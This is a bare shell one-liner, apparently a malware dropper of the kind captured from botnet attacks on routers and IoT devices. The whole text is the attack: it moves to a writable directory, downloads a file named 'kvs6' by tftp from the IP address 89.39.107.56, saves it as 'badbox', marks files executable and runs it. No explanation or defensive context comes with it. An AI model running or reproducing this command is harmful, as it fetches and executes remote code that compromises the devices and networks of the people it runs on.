cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; tftp -r kvs6 -g 89.39.107.56;cat kvs6 >badbox;chmod +x *;./badbox
